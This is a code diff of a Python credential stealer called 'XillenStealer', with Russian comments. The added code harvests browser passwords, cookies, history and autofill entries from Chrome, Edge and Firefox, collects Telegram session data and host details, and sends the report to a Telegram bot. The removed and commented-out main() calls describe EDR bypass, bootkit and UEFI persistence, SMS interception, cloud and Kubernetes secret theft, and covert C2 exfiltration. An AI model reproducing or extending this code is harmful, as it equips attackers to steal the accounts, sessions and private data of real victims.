+            <h4 style='color: var(--accent); margin: 1rem 0 0.5rem 0; padding: 0.5rem; background: var(--bg-secondary); border-radius: 4px;'>
+                <i class="fas fa-globe"></i> {browser} ({len(browser_autofill)} записей)
+            </h4>
+            <div class="autofill-grid">
+        """
+        
+        for i, af in enumerate(browser_autofill[:15], 1):  # Показываем первые 15 для каждого браузера
+            html += f"""
+            <div class="autofill-item">
+                <div class="autofill-name">{af.get('name', 'N/A')}</div>
+                <div class="autofill-value">{af.get('value', 'N/A')}</div>
+            </div>
+            """
+        
+        if len(browser_autofill) > 15:
+            html += f"""
+            <div class="show-more-btn" onclick="showMoreAutofill('{browser}', {len(browser_autofill) - 15})">
+                Показать еще {len(browser_autofill) - 15} записей
+            </div>
+            """
+        
+        html += "</div></div>"
+    
+    return html
+
+def _generate_processes_html(processes, template):
+    """Генерация HTML для процессов"""
+    if not processes:
+        return "<p style='color: var(--text-secondary);'>Процессы не найдены</p>"
+    
+    html = f"<h3 style='color: var(--accent); margin-bottom: 1rem;'>Найдено {len(processes)} процессов</h3>"
+    for i, proc in enumerate(processes[:20], 1):  # Показываем первые 20
+        html += f"""
+        <div class="process-item">
+            <div class="process-name">{proc.get('name', 'N/A')} (PID: {proc.get('pid', 'N/A')})</div>
+            <div style='color: var(--text-secondary); font-size: 0.8rem; margin-top: 0.3rem;'>
+                Пользователь: {proc.get('username', 'N/A')} | CPU: {proc.get('cpu_percent', 0):.1f}% | Память: {proc.get('memory_percent', 0):.1f}%
+            </div>
+        </div>
+        """
+    
+    return html
+
+def _generate_connections_html(connections, template):
+    """Генерация HTML для соединений"""
+    if not connections:
+        return "<p style='color: var(--text-secondary);'>Соединения не найдены</p>"
+    
+    html = f"<h3 style='color: var(--accent); margin-bottom: 1rem;'>Найдено {len(connections)} соединений</h3>"
+    for i, conn in enumerate(connections[:20], 1):  # Показываем первые 20
+        html += f"""
+        <div class="connection-item">
+            <div class="connection-address">{conn.get('local_address', 'N/A')} -> {conn.get('remote_address', 'N/A')}</div>
+            <div style='color: var(--text-secondary); font-size: 0.8rem; margin-top: 0.3rem;'>
+                Статус: {conn.get('status', 'N/A')} | PID: {conn.get('pid', 'N/A')}
+            </div>
+        </div>
+        """
+    
+    return html
+
+def _get_ip_address():
+    try:
+        response = requests.get('https://api.ipify.org', timeout=5)
+        return response.text.strip()
+    except:
+        return "Unknown"
+
+def _collect_browser_passwords():
+    passwords = []
+    try:
+        # Chrome passwords
+        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
+        if os.path.exists(chrome_path):
+            conn = sqlite3.connect(chrome_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for row in cursor.fetchall():
+                if row[1] and row[2]:  # username and password exist
+                    passwords.append({
+                        'url': row[0],
+                        'username': row[1],
+                        'password': '[ENCRYPTED]' if row[2] else '',
+                        'browser': 'Chrome'
+                    })
+            conn.close()
+        
+        # Edge passwords
+        edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data")
+        if os.path.exists(edge_path):
+            conn = sqlite3.connect(edge_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for row in cursor.fetchall():
+                if row[1] and row[2]:
+                    passwords.append({
+                        'url': row[0],
+                        'username': row[1],
+                        'password': '[ENCRYPTED]' if row[2] else '',
+                        'browser': 'Edge'
+                    })
+            conn.close()
+            
+        # Firefox passwords
+        firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
+        if os.path.exists(firefox_path):
+            for profile in os.listdir(firefox_path):
+                if profile.endswith('.default-release') or profile.endswith('.default'):
+                    logins_path = os.path.join(firefox_path, profile, "logins.json")
+                    if os.path.exists(logins_path):
+                        try:
+                            with open(logins_path, 'r', encoding='utf-8') as f:
+                                data = json.load(f)
+                                for login in data.get('logins', []):
+                                    passwords.append({
+                                        'url': login.get('hostname', ''),
+                                        'username': login.get('username', ''),
+                                        'password': '[ENCRYPTED]',
+                                        'browser': 'Firefox'
+                                    })
+                        except:
+                            pass
+    except Exception as e:
+        print(f"Error collecting passwords: {e}")
+    return passwords
+
+def _collect_browser_cookies():
+    cookies = []
+    try:
+        # Chrome cookies
+        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
+        if os.path.exists(chrome_path):
+            conn = sqlite3.connect(chrome_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name, value, host_key, path FROM cookies")
+            for row in cursor.fetchall():
+                cookies.append({
+                    'name': row[0],
+                    'value': row[1],
+                    'domain': row[2],
+                    'path': row[3],
+                    'browser': 'Chrome'
+                })
+            conn.close()
+        
+        # Edge cookies
+        edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies")
+        if os.path.exists(edge_path):
+            conn = sqlite3.connect(edge_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name, value, host_key, path FROM cookies")
+            for row in cursor.fetchall():
+                cookies.append({
+                    'name': row[0],
+                    'value': row[1],
+                    'domain': row[2],
+                    'path': row[3],
+                    'browser': 'Edge'
+                })
+            conn.close()
+            
+        # Firefox cookies
+        firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
+        if os.path.exists(firefox_path):
+            for profile in os.listdir(firefox_path):
+                if profile.endswith('.default-release') or profile.endswith('.default'):
+                    cookies_path = os.path.join(firefox_path, profile, "cookies.sqlite")
+                    if os.path.exists(cookies_path):
+                        try:
+                            conn = sqlite3.connect(cookies_path)
+                            cursor = conn.cursor()
+                            cursor.execute("SELECT name, value, host, path FROM moz_cookies")
+                            for row in cursor.fetchall():
+                                cookies.append({
+                                    'name': row[0],
+                                    'value': row[1],
+                                    'domain': row[2],
+                                    'path': row[3],
+                                    'browser': 'Firefox'
+                                })
+                            conn.close()
+                        except:
+                            pass
+    except Exception as e:
+        print(f"Error collecting cookies: {e}")
+    return cookies
+
+def _collect_processes():
+    processes = []
+    try:
+        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
+            try:
+                processes.append({
+                    'pid': proc.info['pid'],
+                    'name': proc.info['name'],
+                    'username': proc.info['username'],
+                    'cpu_percent': proc.info['cpu_percent'],
+                    'memory_percent': proc.info['memory_percent']
+                })
+            except:
+                continue
+    except Exception as e:
+        print(f"Error collecting processes: {e}")
+    return processes
+
+def _collect_connections():
+    connections = []
+    try:
+        for conn in psutil.net_connections():
+            connections.append({
+                'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A",
+                'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
+                'status': conn.status,
+                'pid': conn.pid
+            })
+    except Exception as e:
+        print(f"Error collecting connections: {e}")
+    return connections
+
+def _collect_browser_history():
+    history = []
+    try:
+        # Chrome history
+        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
+        if os.path.exists(chrome_path):
+            conn = sqlite3.connect(chrome_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
+            for row in cursor.fetchall():
+                history.append({
+                    'url': row[0],
+                    'title': row[1],
+                    'visit_count': row[2],
+                    'last_visit': row[3],
+                    'browser': 'Chrome'
+                })
+            conn.close()
+        
+        # Edge history
+        edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
+        if os.path.exists(edge_path):
+            conn = sqlite3.connect(edge_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
+            for row in cursor.fetchall():
+                history.append({
+                    'url': row[0],
+                    'title': row[1],
+                    'visit_count': row[2],
+                    'last_visit': row[3],
+                    'browser': 'Edge'
+                })
+            conn.close()
+    except Exception as e:
+        print(f"Error collecting history: {e}")
+    return history
+
+def _collect_autofill_data():
+    autofill = []
+    try:
+        # Chrome autofill
+        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data")
+        if os.path.exists(chrome_path):
+            conn = sqlite3.connect(chrome_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name, value, date_created FROM autofill ORDER BY date_created DESC LIMIT 50")
+            for row in cursor.fetchall():
+                autofill.append({
+                    'name': row[0],
+                    'value': row[1],
+                    'date_created': row[2],
+                    'browser': 'Chrome'
+                })
+            conn.close()
+        
+        # Edge autofill
+        edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data")
+        if os.path.exists(edge_path):
+            conn = sqlite3.connect(edge_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name, value, date_created FROM autofill ORDER BY date_created DESC LIMIT 50")
+            for row in cursor.fetchall():
+                autofill.append({
+                    'name': row[0],
+                    'value': row[1],
+                    'date_created': row[2],
+                    'browser': 'Edge'
+                })
+            conn.close()
+    except Exception as e:
+        print(f"Error collecting autofill: {e}")
+    return autofill
+
 def main():
-    sleep_obf = SleepObfuscation()
-    sleep_obf.obfuscated_sleep(config.SLEEP_BEFORE_START)
-    anti_dumping = AntiDumping()
-    anti_dumping.prevent_dumping()
-    anti_analysis = AdvancedAntiAnalysis()
-    if anti_analysis.check_debugger_hashes():
-        sys.exit(0)
-    if anti_analysis.detect_memory_analysis():
-        sys.exit(0)
-    if anti_analysis.check_reverse_tools():
-        sys.exit(0)
-    anti_analysis.emulate_legitimate_software()
-    ai_analyzer = AIAnalyzer()
-    environment_analysis = ai_analyzer.analyze_environment()
-    edr_bypass = EDRBypass()
-    edr_bypass.disable_edr()
-    zero_day_exploiter = ZeroDayExploiter()
-    zero_day_exploiter.run_exploits()
-    bootkit = BootkitPersistence()
-    bootkit.infect_boot_sector()
-    uefi_persist = UEFIPersistence()
-    uefi_persist.install_uefi_module()
-    uefi_rootkit = UEFIRootkit()
-    uefi_rootkit.flash_uefi_bios()
-    kernel_executor = KernelModeExecutor()
-    kernel_executor.load_kernel_driver()
-    container_persistence = ContainerPersistence()
-    container_persistence.infect_container_runtime()
-    gpu_memory = GPUMemory()
-    gpu_memory.hide_data_in_gpu("Xillen Hidden Data")
-    ebpf_hooks = EBPFHooks()
-    ebpf_hooks.install_traffic_hooks()
-    tpm_module = TPMModule()
-    tpm_keys = tpm_module.extract_tpm_keys()
-    network_card_firmware = NetworkCardFirmware()
-    network_card_firmware.modify_network_firmware()
-    virtual_file_system = VirtualFileSystem()
-    virtual_file_system.create_hidden_vfs()
-    acpi_tables = ACPITables()
-    acpi_tables.modify_acpi_tables()
-    dma_attacks = DMAAttacks()
-    dma_attacks.perform_dma_attack()
-    wireless_c2 = WirelessC2()
-    wireless_c2.setup_wireless_c2()
-    cloud_proxy = CloudProxy()
-    virtualization_monitor = VirtualizationMonitor()
-    detected_hypervisors = virtualization_monitor.detect_hypervisor()
-    device_emulation = DeviceEmulation()
-    device_emulation.emulate_usb_device()
-    syscall_hooks = SyscallHooks()
-    syscall_hooks.install_syscall_hooks()
-    multi_factor_auth = MultiFactorAuth()
-    multi_factor_auth.intercept_sms("+1234567890")
-    cloud_configs = CloudConfigs()
-    cloud_metadata = cloud_configs.collect_cloud_metadata()
-    aws_credentials = cloud_configs.extract_aws_credentials()
-    orchestrator_configs = OrchestratorConfigs()
-    kubeconfigs = orchestrator_configs.collect_kubeconfigs()
-    kubernetes_secrets = orchestrator_configs.extract_kubernetes_secrets()
-    service_mesh = ServiceMesh()
-    service_mesh_configs = service_mesh.collect_service_mesh_configs()
-    service_mesh.intercept_envoy_traffic()
-    payment_systems = PaymentSystems()
-    credit_cards = payment_systems.scan_credit_cards()
-    mobile_emulators = MobileEmulators()
-    detected_emulators = mobile_emulators.detect_mobile_emulators()
-    emulator_data = mobile_emulators.extract_emulator_data()
-    system_monitor = SystemMonitor()
-    installed_software = system_monitor.get_installed_software()
-    network_connections = system_monitor.get_network_connections()
-    running_processes = system_monitor.get_running_processes()
-    system_uptime = system_uptime = system_monitor.get_system_uptime()
-    if system_uptime < 300:
-        log("System is too fresh, exiting")
-        sys.exit(0)
-    if OS_TYPE == "Linux":
-        linux_persist = LinuxPersistence()
-        linux_persist.install_systemd_service()
-        linux_persist.install_cron_job()
-        linux_persist.modify_rc_local()
-    if OS_TYPE == "Windows":
-        wmi_persist = WMIPersistence()
-        wmi_persist.create_event_subscription()
-        shell_ext = ShellExtensions()
-        shell_ext.register_shell_extension()
-        binary_rep = BinaryReplacement()
-        binary_rep.replace_system_binary()
-        com_persist = COMPersistence()
-        com_persist.register_com_object()
+    print("[DEBUG] Starting XillenStealer...")
+    print(f"[DEBUG] Bot token: {config.TG_BOT_TOKEN[:10]}...")
+    print(f"[DEBUG] Chat ID: {config.TG_CHAT_ID}")
+    
+    # Пропускаем тяжелые операции для скорости
+    # bootkit = BootkitPersistence()
+    # bootkit.infect_boot_sector()  # Отключено для тестов - может крашить комп
+    # uefi_persist = UEFIPersistence()
+    # uefi_persist.install_uefi_module()  # Отключено для тестов - может крашить комп
+    # uefi_rootkit = UEFIRootkit()
+    # uefi_rootkit.flash_uefi_bios()  # Отключено для тестов - может крашить комп
+    # kernel_executor = KernelModeExecutor()
+    # kernel_executor.load_kernel_driver()  # Отключено для тестов - может крашить комп
+    # container_persistence = ContainerPersistence()
+    # container_persistence.infect_container_runtime()  # Отключено для тестов - может крашить комп
+    # gpu_memory = GPUMemory()
+    # gpu_memory.hide_data_in_gpu("Xillen Hidden Data")  # Отключено для тестов - может крашить комп
+    # ebpf_hooks = EBPFHooks()
+    # ebpf_hooks.install_traffic_hooks()  # Отключено для тестов - может крашить комп
+    # tpm_module = TPMModule()
+    # tpm_keys = tpm_module.extract_tpm_keys()  # Отключено для тестов - может крашить комп
+    # network_card_firmware = NetworkCardFirmware()
+    # network_card_firmware.modify_network_firmware()  # Отключено для тестов - может крашить комп
+    # virtual_file_system = VirtualFileSystem()
+    # virtual_file_system.create_hidden_vfs()  # Отключено для тестов - может крашить комп
+    # acpi_tables = ACPITables()
+    # acpi_tables.modify_acpi_tables()  # Отключено для тестов - может крашить комп
+    # dma_attacks = DMAAttacks()
+    # dma_attacks.perform_dma_attack()  # Отключено для тестов - может крашить комп
+    # wireless_c2 = WirelessC2()
+    # wireless_c2.setup_wireless_c2()  # Отключено для тестов - может крашить комп
+    # cloud_proxy = CloudProxy()
+    # virtualization_monitor = VirtualizationMonitor()
+    # detected_hypervisors = virtualization_monitor.detect_hypervisor()  # Отключено для тестов - может крашить комп
+    # device_emulation = DeviceEmulation()
+    # device_emulation.emulate_usb_device()  # Отключено для тестов - может крашить комп
+    # syscall_hooks = SyscallHooks()
+    # syscall_hooks.install_syscall_hooks()  # Отключено для тестов - может крашить комп
+    # multi_factor_auth = MultiFactorAuth()
+    # multi_factor_auth.intercept_sms("+1234567890")  # Отключено для тестов - может крашить комп
+    # cloud_configs = CloudConfigs()
+    # cloud_metadata = cloud_configs.collect_cloud_metadata()  # Отключено для тестов - может крашить комп
+    # aws_credentials = cloud_configs.extract_aws_credentials()  # Отключено для тестов - может крашить комп
+    # orchestrator_configs = OrchestratorConfigs()
+    # kubeconfigs = orchestrator_configs.collect_kubeconfigs()  # Отключено для тестов - может крашить комп
+    # kubernetes_secrets = orchestrator_configs.extract_kubernetes_secrets()  # Отключено для тестов - может крашить комп
+    # service_mesh = ServiceMesh()
+    # service_mesh_configs = service_mesh.collect_service_mesh_configs()  # Отключено для тестов - может крашить комп
+    # service_mesh.intercept_envoy_traffic()  # Отключено для тестов - может крашить комп
+    # payment_systems = PaymentSystems()
+    # credit_cards = payment_systems.scan_credit_cards()  # Отключено для тестов - может крашить комп
+    # mobile_emulators = MobileEmulators()
+    # detected_emulators = mobile_emulators.detect_mobile_emulators()  # Отключено для тестов - может крашить комп
+    # emulator_data = mobile_emulators.extract_emulator_data()  # Отключено для тестов - может крашить комп
+    # system_monitor = SystemMonitor()
+    # installed_software = system_monitor.get_installed_software()  # Отключено для тестов - может крашить комп
+    # network_connections = system_monitor.get_network_connections()  # Отключено для тестов - может крашить комп
+    # running_processes = system_monitor.get_running_processes()  # Отключено для тестов - может крашить комп
+    # system_uptime = system_uptime = system_monitor.get_system_uptime()  # Отключено для тестов - может крашить комп
+    # if system_uptime < 300:  # Отключено для тестов - может крашить комп
+    #     log("System is too fresh, exiting")  # Отключено для тестов - может крашить комп
+    #     sys.exit(0)  # Отключено для тестов - может крашить комп
+    # if OS_TYPE == "Linux":  # Отключено для тестов - может крашить комп
+    #     linux_persist = LinuxPersistence()  # Отключено для тестов - может крашить комп
+    #     linux_persist.install_systemd_service()  # Отключено для тестов - может крашить комп
+    #     linux_persist.install_cron_job()  # Отключено для тестов - может крашить комп
+    #     linux_persist.modify_rc_local()  # Отключено для тестов - может крашить комп
+    # if OS_TYPE == "Windows":  # Отключено для тестов - может крашить комп
+    #     wmi_persist = WMIPersistence()  # Отключено для тестов - может крашить комп
+    #     wmi_persist.create_event_subscription()  # Отключено для тестов - может крашить комп
+    #     shell_ext = ShellExtensions()  # Отключено для тестов - может крашить комп
+    #     shell_ext.register_shell_extension()  # Отключено для тестов - может крашить комп
+    #     binary_rep = BinaryReplacement()  # Отключено для тестов - может крашить комп
+    #     binary_rep.replace_system_binary()  # Отключено для тестов - может крашить комп
+    #     com_persist = COMPersistence()  # Отключено для тестов - может крашить комп
+    #     com_persist.register_com_object()  # Отключено для тестов - может крашить комп
+    # data_collector = ExtendedDataCollector()
+    # collected_data = {}
+    # data_collector.start_clipboard_monitoring()  # Отключено для тестов - может крашить комп
+    # data_collector.start_file_system_watching()  # Отключено для тестов - может крашить комп
+    # collected_data['crypto_wallets'] = data_collector.collect_crypto_wallets_extended()  # Отключено для тестов - может крашить комп
+    # collected_data['browser_data'] = data_collector.collect_browser_data_extended()  # Отключено для тестов - может крашить комп
+    # collected_data['config_files'] = data_collector.collect_config_files()  # Отключено для тестов - может крашить комп
+    # collected_data['ftp_ssh'] = data_collector.collect_ftp_ssh_clients()  # Отключено для тестов - может крашить комп
+    # collected_data['databases'] = data_collector.collect_databases()  # Отключено для тестов - может крашить комп
+    # collected_data['backups'] = data_collector.collect_backups()  # Отключено для тестов - может крашить комп
+    # collected_data['software'] = installed_software  # Отключено для тестов - может крашить комп
+    # collected_data['network'] = network_connections  # Отключено для тестов - может крашить комп
+    # collected_data['processes'] = running_processes  # Отключено для тестов - может крашить комп
+    # collected_data['totp'] = data_collector.collect_totp_data()  # Отключено для тестов - может крашить комп
+    # collected_data['biometric'] = data_collector.collect_biometric_data()  # Отключено для тестов - может крашить комп
+    # collected_data['iot_devices'] = data_collector.scan_iot_devices()  # Отключено для тестов - может крашить комп
+    # collected_data['docker'] = data_collector.explore_docker_containers()  # Отключено для тестов - может крашить комп
+    # collected_data['tpm_keys'] = tpm_keys  # Отключено для тестов - может крашить комп
+    # collected_data['cloud_metadata'] = cloud_metadata  # Отключено для тестов - может крашить комп
+    # collected_data['aws_credentials'] = aws_credentials  # Отключено для тестов - может крашить комп
+    # collected_data['kubeconfigs'] = kubeconfigs  # Отключено для тестов - может крашить комп
+    # collected_data['kubernetes_secrets'] = kubernetes_secrets  # Отключено для тестов - может крашить комп
+    # collected_data['service_mesh_configs'] = service_mesh_configs  # Отключено для тестов - может крашить комп
+    # collected_data['credit_cards'] = credit_cards  # Отключено для тестов - может крашить комп
+    # collected_data['mobile_emulators'] = detected_emulators  # Отключено для тестов - может крашить комп
+    # collected_data['emulator_data'] = emulator_data  # Отключено для тестов - может крашить комп
+    # collected_data['enhanced_cookies'] = data_collector.extract_enhanced_cookies()  # Отключено для тестов - может крашить комп
+    # collected_data['game_launchers'] = data_collector.extract_game_launcher_data()  # Отключено для тестов - может крашить комп
+    # collected_data['browser_fingerprint'] = data_collector.collect_browser_fingerprint()  # Отключено для тестов - может крашить комп
+    # collected_data['clipboard_history'] = data_collector.get_clipboard_history()  # Отключено для тестов - может крашить комп
+    # collected_data['file_changes'] = data_collector.get_file_changes()  # Отключено для тестов - может крашить комп
+    # collected_data['network_traffic_analysis'] = data_collector.analyze_network_traffic()  # Отключено для тестов - может крашить комп
+    # collected_data['password_managers'] = data_collector.extract_password_manager_data()  # Отключено для тестов - может крашить комп
+    # collected_data['social_media_tokens'] = data_collector.extract_social_media_tokens()  # Отключено для тестов - может крашить комп
+    # if OS_TYPE == "Linux":  # Отключено для тестов - может крашить комп
+    #     collected_data['linpeas_scan'] = data_collector.run_linpeas_scan()  # Отключено для тестов - может крашить комп
+    # data_collector.dump_browser_memory()  # Отключено для тестов - может крашить комп
+    # webrtc_collector = WebRTCCollector()  # Отключено для тестов - может крашить комп
+    # collected_data['webrtc'] = webrtc_collector.collect_webrtc_data()  # Отключено для тестов - может крашить комп
+    # process_injector = ProcessInjection()  # Отключено для тестов - может крашить комп
+    # if process_injector.inject_into_network_process():  # Отключено для тестов - может крашить комп
+    #     log("Injected into network process")  # Отключено для тестов - может крашить комп
+    # ntfs_streams = NTFSStreams()  # Отключено для тестов - может крашить комп
+    # ntfs_streams.hide_data_in_stream("C:\\Windows\\System32\\drivers\\etc\\hosts", "xillen_data", str(collected_data))  # Отключено для тестов - может крашить комп
+    # steganography = Steganography()  # Отключено для тестов - может крашить комп
+    # steganography.hide_in_image("C:\\Windows\\Web\\Screen\\img100.jpg", str(collected_data).encode())  # Отключено для тестов - может крашить комп
+    # cdn_c2 = CDNC2()  # Отключено для тестов - может крашить комп
+    # cdn_c2.communicate_via_cdn(collected_data)  # Отключено для тестов - может крашить комп
+    # blockchain_c2 = BlockchainC2()  # Отключено для тестов - может крашить комп
+    # blockchain_c2.send_via_blockchain(str(collected_data).encode())  # Отключено для тестов - может крашить комп
+    # cloud_proxy.proxy_through_cloud(str(collected_data))  # Отключено для тестов - может крашить комп
+    # self_modifying = SelfModifyingCode()  # Отключено для тестов - может крашить комп
+    # self_modifying.mutate_self()  # Отключено для тестов - может крашить комп
+    # if config.SELF_DESTRUCT:  # Отключено для тестов - может крашить комп
+    #     try:  # Отключено для тестов - может крашить комп
+    #         os.remove(sys.argv[0])  # Отключено для тестов - может крашить комп
+    #     except:  # Отключено для тестов - может крашить комп
+    #         pass  # Отключено для тестов - может крашить комп
+    
+    # Сбор основных данных
+    log("Collecting system information...")
+    system_info = {
+        'hostname': socket.gethostname(),
+        'os': f"{platform.system()} {platform.release()}",
+        'architecture': platform.architecture()[0],
+        'processor': platform.processor(),
+        'user': getpass.getuser(),
+        'cpu_count': psutil.cpu_count(),
+        'memory_gb': round(psutil.virtual_memory().total / (1024**3), 2),
+        'ip_address': _get_ip_address(),
+        'mac_address': ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    }
+    
+    log("Collecting browser passwords...")
+    passwords = _collect_browser_passwords()
+    
+    log("Collecting browser cookies...")
+    cookies = _collect_browser_cookies()
+    
+    log("Collecting processes...")
+    processes = _collect_processes()
+    
+    log("Collecting network connections...")
+    connections = _collect_connections()
+    
+    log("Collecting browser history...")
+    history = _collect_browser_history()
+    
+    log("Collecting autofill data...")
+    autofill = _collect_autofill_data()
+    
+    log("Collecting Telegram tdata...")
     data_collector = ExtendedDataCollector()
-    collected_data = {}
-    data_collector.start_clipboard_monitoring()
-    data_collector.start_file_system_watching()
-    collected_data['crypto_wallets'] = data_collector.collect_crypto_wallets_extended()
-    collected_data['browser_data'] = data_collector.collect_browser_data_extended()
-    collected_data['config_files'] = data_collector.collect_config_files()
-    collected_data['ftp_ssh'] = data_collector.collect_ftp_ssh_clients()
-    collected_data['databases'] = data_collector.collect_databases()
-    collected_data['backups'] = data_collector.collect_backups()
-    collected_data['software'] = installed_software
-    collected_data['network'] = network_connections
-    collected_data['processes'] = running_processes
-    collected_data['totp'] = data_collector.collect_totp_data()
-    collected_data['biometric'] = data_collector.collect_biometric_data()
-    collected_data['iot_devices'] = data_collector.scan_iot_devices()
-    collected_data['docker'] = data_collector.explore_docker_containers()
-    collected_data['tpm_keys'] = tpm_keys
-    collected_data['cloud_metadata'] = cloud_metadata
-    collected_data['aws_credentials'] = aws_credentials
-    collected_data['kubeconfigs'] = kubeconfigs
-    collected_data['kubernetes_secrets'] = kubernetes_secrets
-    collected_data['service_mesh_configs'] = service_mesh_configs
-    collected_data['credit_cards'] = credit_cards
-    collected_data['mobile_emulators'] = detected_emulators
-    collected_data['emulator_data'] = emulator_data
-    collected_data['enhanced_cookies'] = data_collector.extract_enhanced_cookies()
-    collected_data['game_launchers'] = data_collector.extract_game_launcher_data()
-    collected_data['browser_fingerprint'] = data_collector.collect_browser_fingerprint()
-    collected_data['clipboard_history'] = data_collector.get_clipboard_history()
-    collected_data['file_changes'] = data_collector.get_file_changes()
-    collected_data['network_traffic_analysis'] = data_collector.analyze_network_traffic()
-    collected_data['password_managers'] = data_collector.extract_password_manager_data()
-    collected_data['social_media_tokens'] = data_collector.extract_social_media_tokens()
-    if OS_TYPE == "Linux":
-        collected_data['linpeas_scan'] = data_collector.run_linpeas_scan()
-    data_collector.dump_browser_memory()
-    webrtc_collector = WebRTCCollector()
-    collected_data['webrtc'] = webrtc_collector.collect_webrtc_data()
-    process_injector = ProcessInjection()
-    if process_injector.inject_into_network_process():
-        log("Injected into network process")
-    ntfs_streams = NTFSStreams()
-    ntfs_streams.hide_data_in_stream("C:\\Windows\\System32\\drivers\\etc\\hosts", "xillen_data", str(collected_data))
-    steganography = Steganography()
-    steganography.hide_in_image("C:\\Windows\\Web\\Screen\\img100.jpg", str(collected_data).encode())
-    cdn_c2 = CDNC2()
-    cdn_c2.communicate_via_cdn(collected_data)
-    blockchain_c2 = BlockchainC2()
-    blockchain_c2.send_via_blockchain(str(collected_data).encode())
-    cloud_proxy.proxy_through_cloud(str(collected_data))
-    self_modifying = SelfModifyingCode()
-    self_modifying.mutate_self()
-    if config.SELF_DESTRUCT:
-        try:
-            os.remove(sys.argv[0])
-        except:
-            pass
+    telegram_tdata = data_collector.collect_telegram_tdata()
+    
+    collected_data = {
+        'system_info': system_info,
+        'passwords': passwords,
+        'cookies': cookies,
+        'processes': processes,
+        'network_connections': connections,
+        'history': history,
+        'autofill': autofill,
+        'telegram_tdata': telegram_tdata
+    }
+    
+    log("Data collection completed! Preparing to send to Telegram...")
     telegram_language = getattr(config, 'TELEGRAM_LANGUAGE', 'ru')
+    log(f"Sending report to Telegram in {telegram_language} language...")
     send_telegram_report(collected_data, telegram_language)
     log("Advanced data collection completed")
 if __name__ == "__main__":
